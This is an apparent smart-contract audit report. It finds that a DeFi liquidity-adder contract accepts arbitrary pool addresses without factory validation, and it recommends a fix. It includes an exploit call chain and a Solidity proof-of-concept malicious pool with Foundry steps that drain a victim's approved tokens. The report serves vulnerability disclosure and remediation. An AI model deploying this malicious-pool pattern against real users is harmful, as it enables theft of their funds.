Audit Report

## Title
Missing Factory Pool Validation in `MetricOmmPoolLiquidityAdder` Allows Malicious Pool to Drain User Funds - (File: `metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol`)

## Summary

`MetricOmmPoolLiquidityAdder` accepts an arbitrary caller-supplied `pool` address in every public entry point without verifying it against the factory registry. A user tricked into calling any `addLiquidityExactShares` or `addLiquidityWeighted` overload with a malicious pool address will have up to `maxAmountToken0` of token0 and `maxAmountToken1` of token1 transferred directly from their wallet to the malicious pool via the callback settlement path. The contract's own NatDoc explicitly acknowledges this gap, and the router's analogous `_requireFactoryPool` guard confirms the protocol is aware of this risk class.

## Finding Description

**Root cause — no factory check before storing pool in transient context:**

`_addLiquidity` calls `_setPayContext(pool, payer, maxAmountToken0, maxAmountToken1)` at line 193 and then immediately calls `pool.addLiquidity(...)` at line 194, with no `FACTORY.isPool(pool)` guard anywhere in the call chain. [1](#0-0) 

The NatDoc at lines 19–21 explicitly acknowledges this: [2](#0-1) 

**Contrast with the router, which enforces the check:**

`MetricOmmSwapRouterBase._setNextCallbackContext` calls `_requireFactoryPool(pool)` before storing any pool in transient context, and `_requireExpectedCallbackCaller` re-validates via `FACTORY.isPool(caller)` in the callback. [3](#0-2) [4](#0-3) 

**Callback check is trivially bypassed:**

`metricOmmModifyLiquidityCallback` validates only `msg.sender == expectedPool` (line 164). Because `expectedPool` was set to the malicious pool address by `_setPayContext`, this check is trivially satisfied by the malicious pool that was just called. [5](#0-4) 

**Token addresses are read from the malicious pool:**

After passing the caller check, the callback reads `token0`/`token1` from `IMetricOmmPool(msg.sender).getImmutables()` — i.e., from the malicious pool — and calls `pay(token0, payer, msg.sender, amount0Delta)` / `pay(token1, payer, msg.sender, amount1Delta)`. [6](#0-5) 

**`pay` executes `safeTransferFrom` from the victim:**

`pay` calls `IERC20(token).safeTransferFrom(payer, recipient, value)`, pulling real tokens from the victim's wallet to the malicious pool. [7](#0-6) 

**Full exploit call chain:**

1. Attacker deploys `MaliciousPool` with attacker-controlled `token0`, `token1`, and `getImmutables()`.
2. Victim approves `MetricOmmPoolLiquidityAdder` for those tokens.
3. Victim is tricked (phishing UI / compromised front-end) into calling `addLiquidityExactShares(maliciousPool, victim, salt, deltas, MAX0, MAX1, "")`. `payer = msg.sender = victim`.
4. `_addLiquidity` stores `maliciousPool` as `expectedPool` in transient context, then calls `maliciousPool.addLiquidity(...)`.
5. `maliciousPool.addLiquidity` immediately calls back `metricOmmModifyLiquidityCallback(MAX0, MAX1, abi.encode(KIND_PAY))`.
6. `msg.sender == expectedPool` check passes (both are `maliciousPool`).
7. Adder reads token addresses from `maliciousPool.getImmutables()` and calls `pay(token0, victim, maliciousPool, MAX0)` and `pay(token1, victim, maliciousPool, MAX1)`.
8. `safeTransferFrom(victim, maliciousPool, MAX0/MAX1)` executes — victim's tokens are drained.

The `addLiquidityWeighted` variant is equally exploitable: `_validateBinAndBinPosition` calls `PoolStateLibrary._slot0(pool)` on the malicious pool (which can return values that pass bounds checks), and the malicious pool controls the `need0`/`need1` probe revert values used in share scaling. [8](#0-7) 

## Impact Explanation

Direct loss of user principal: any user who has approved `MetricOmmPoolLiquidityAdder` and is induced to call any `addLiquidityExactShares` or `addLiquidityWeighted` overload with a malicious pool address loses up to `maxAmountToken0` of token0 and `maxAmountToken1` of token1 in a single transaction, with no recovery path. This meets the Critical/High direct-loss-of-user-principal threshold.

## Likelihood Explanation

The trigger requires the victim to call the adder with a malicious pool address (the payer is always `msg.sender`, so the attacker cannot drain the victim by calling the function themselves). This is achievable via a phishing UI, a compromised front-end, or a misleading integration — all realistic attack surfaces for a public, permissionless periphery contract. The victim must also have pre-approved the adder, which is the normal prerequisite for using it. The router's analogous `_requireFactoryPool` guard demonstrates the protocol is aware of this risk class and chose to enforce it in the swap path but not here. [9](#0-8) 

## Recommendation

Add a factory validation call at the top of `_addLiquidity` (or in each public entry point), mirroring the router pattern. This requires storing the factory address as an immutable in `MetricOmmPoolLiquidityAdder`, exactly as `MetricOmmSwapRouterBase` does:

```solidity
IMetricOmmPoolFactory internal immutable FACTORY;

constructor(address weth, address factory) PeripheryPayments(weth) {
    if (factory == address(0)) revert InvalidFactory();
    FACTORY = IMetricOmmPoolFactory(factory);
}

function _addLiquidity(address pool, ...) internal returns (...) {
    if (!FACTORY.isPool(pool)) revert InvalidPool(pool);
    _setPayContext(pool, payer, maxAmountToken0, maxAmountToken1);
    ...
}
``` [10](#0-9) 

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {IMetricOmmPool, PoolImmutables} from "@metric-core/interfaces/IMetricOmmPool/IMetricOmmPool.sol";
import {LiquidityDelta} from "@metric-core/types/PoolOperation.sol";
import {MetricOmmPoolLiquidityAdder} from "metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol";

contract MaliciousPool {
    address public immutable token0;
    address public immutable token1;
    MetricOmmPoolLiquidityAdder immutable adder;
    uint256 immutable MAX0;
    uint256 immutable MAX1;

    constructor(address _token0, address _token1, address _adder, uint256 _max0, uint256 _max1) {
        token0 = _token0; token1 = _token1;
        adder = MetricOmmPoolLiquidityAdder(payable(_adder));
        MAX0 = _max0; MAX1 = _max1;
    }

    // Returns fake immutables so the adder reads attacker-controlled token addresses
    function getImmutables() external view returns (PoolImmutables memory imm) {
        imm.token0 = token0;
        imm.token1 = token1;
    }

    // Called by adder._addLiquidity — immediately fires the paying callback
    function addLiquidity(address, uint80, LiquidityDelta calldata, bytes calldata, bytes calldata)
        external returns (uint256, uint256)
    {
        adder.metricOmmModifyLiquidityCallback(MAX0, MAX1, abi.encode(uint8(1))); // KIND_PAY = 1
        return (MAX0, MAX1);
    }
}

// Attack steps (Foundry test):
// 1. Deploy MaliciousPool(token0, token1, adderAddress, MAX0, MAX1)
// 2. vm.prank(victim); token0.approve(adderAddress, MAX0);
// 3. vm.prank(victim); token1.approve(adderAddress, MAX1);
// 4. vm.prank(victim); adder.addLiquidityExactShares(
//        address(maliciousPool), victim, 0, deltas, MAX0, MAX1, ""
//    );
// 5. Assert: token0.balanceOf(address(maliciousPool)) == MAX0
//            token1.balanceOf(address(maliciousPool)) == MAX1
//            token0.balanceOf(victim) == 0
//            token1.balanceOf(victim) == 0
```

### Citations

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L19-21)
```text
/// @dev The caller is responsible for supplying a legitimate pool address and other non-malicious parameters.
///      This contract does not verify the pool against the factory; a malicious pool can request token pulls up to
///      the caller-provided max caps during callback settlement.
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L106-115)
```text
    try IMetricOmmPoolActions(pool)
      .addLiquidity(owner, salt, weightDeltas, abi.encode(KIND_PROBE), extensionData) returns (
      uint256, uint256
    ) {
      revert WeightedProbeInconclusive();
    } catch (bytes memory reason) {
      (uint256 need0, uint256 need1) = _decodeLiquidityProbeOrBubble(reason);
      LiquidityDelta memory scaled = _scaleWeightsToShares(weightDeltas, maxAmountToken0, maxAmountToken1, need0, need1);
      return _addLiquidity(pool, owner, salt, scaled, msg.sender, maxAmountToken0, maxAmountToken1, extensionData);
    }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L162-167)
```text
    (address expectedPool, address payer, uint256 max0, uint256 max1) = _loadPayContext();
    if (expectedPool == address(0)) revert CallbackContextNotActive();
    if (msg.sender != expectedPool) revert InvalidCallbackCaller(msg.sender, expectedPool);
    if (amount0Delta > max0 || amount1Delta > max1) {
      revert MaxAmountExceeded(amount0Delta, amount1Delta, max0, max1);
    }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L169-177)
```text
    PoolImmutables memory imm = IMetricOmmPool(msg.sender).getImmutables();
    address token0 = imm.token0;
    address token1 = imm.token1;
    if (amount0Delta > 0) {
      pay(token0, payer, msg.sender, amount0Delta);
    }
    if (amount1Delta > 0) {
      pay(token1, payer, msg.sender, amount1Delta);
    }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L193-196)
```text
    _setPayContext(pool, payer, maxAmountToken0, maxAmountToken1);
    try IMetricOmmPoolActions(pool)
      .addLiquidity(positionOwner, salt, deltas, abi.encode(KIND_PAY), extensionData) returns (
      uint256 a0, uint256 a1
```

**File:** metric-periphery/contracts/base/MetricOmmSwapRouterBase.sol (L20-25)
```text
  IMetricOmmPoolFactory internal immutable FACTORY;

  constructor(address factory) {
    if (factory == address(0)) revert IMetricOmmSimpleRouter.InvalidFactory();
    FACTORY = IMetricOmmPoolFactory(factory);
  }
```

**File:** metric-periphery/contracts/base/MetricOmmSwapRouterBase.sol (L29-32)
```text
  function _setNextCallbackContext(address pool, uint8 callbackMode, address payer, address tokenToPay) internal {
    _requireFactoryPool(pool);
    TransientCallbackPool.set(pool, callbackMode, payer, tokenToPay);
  }
```

**File:** metric-periphery/contracts/base/MetricOmmSwapRouterBase.sol (L82-85)
```text
  function _requireExpectedCallbackCaller(address caller) internal view {
    TransientCallbackPool.requireCaller(caller);
    if (!FACTORY.isPool(caller)) revert IMetricOmmSimpleRouter.InvalidPool(caller);
  }
```

**File:** metric-periphery/contracts/base/MetricOmmSwapRouterBase.sol (L87-89)
```text
  function _requireFactoryPool(address pool) internal view {
    if (!FACTORY.isPool(pool)) revert IMetricOmmSimpleRouter.InvalidPool(pool);
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L85-87)
```text
    } else {
      IERC20(token).safeTransferFrom(payer, recipient, value);
    }
```
